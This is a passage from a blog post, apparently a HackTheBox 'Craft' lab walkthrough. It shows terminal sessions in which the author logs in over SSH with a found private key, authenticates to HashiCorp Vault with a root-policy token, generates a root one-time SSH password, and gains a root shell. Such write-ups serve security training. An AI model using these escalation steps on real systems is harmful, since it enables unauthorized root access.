+<p><img src="https://www.worldisend.com/img/image-20220829173504487.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829173504487"></p>
+<p>密钥是加密的，但是数据库中的密码可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox/craft-infra/.ssh$ ssh -i id_rsa gilfoyle@10.10.10.110<br><br><br>  .   *   ..  . *  *<br>*  * @()Ooc()*   o  .<br>    (Q@*0CG*O()  ___<br>   |\_________/|/ _ \<br>   |  |  |  |  | / | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | \_| |<br>   |  |  |  |  |\___/<br>   |\_|__|__|_/|<br>    \_________/<br><br><br><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Linux craft.htb 4.9.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Jun 16 01:32:37 2021 from 10.10.14.2<br>gilfoyle@craft:~$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">gilfoyle@craft:~$ vault login<br>Token (will be hidden): <br>Success! You are now authenticated. The token information displayed below<br>is already stored <span class="hljs-keyword">in</span> the token helper. You <span class="hljs-keyword">do</span> NOT need to run <span class="hljs-string">&quot;vault login&quot;</span><br>again. Future Vault requests will automatically use this token.<br><br>Key                  Value<br>---                  -----<br>token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br>token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103<br>token_duration       ∞<br>token_renewable      <span class="hljs-literal">false</span><br>token_policies       [<span class="hljs-string">&quot;root&quot;</span>]<br>identity_policies    []<br>policies             [<span class="hljs-string">&quot;root&quot;</span>]<br>gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1<br>Key                Value<br>---                -----<br>lease_id           ssh/creds/root_otp/6843253c-c9d7-b905-0dce-c5eb0227e646<br>lease_duration     768h<br>lease_renewable    <span class="hljs-literal">false</span><br>ip                 127.0.0.1<br>key                30f549eb-6351-79b4-9da0-96e1927769c5<br>key_type           otp<br>port               22<br>username           root<br>gilfoyle@craft:~$ <br></code></pre></td></tr></table></figure>
+
+<p>vault这个东西我也是第一次接触，网上找了相关文档，发现key就可以当做ssh链接的密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">   |\_________/|/ _ \<br>   |  |  |  |  | / | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | | | |<br>   |  |  |  |  | \_| |<br>   |  |  |  |  |\___/<br>   |\_|__|__|_/|<br>    \_________/<br><br><br><br>(root@10.10.10.110) Password: <br>Linux craft.htb 4.9.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Jun 16 01:32:59 2021 from 127.0.0.1<br>root@craft:~<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Craft</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Craft/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>CrazyInSide</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Cascade/" title="HackTheBox-Cascade">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-Cascade</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Delivery/" title="HackTheBox-Delivery">
+                        <span class="hidden-mobile">HackTheBox-Delivery</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
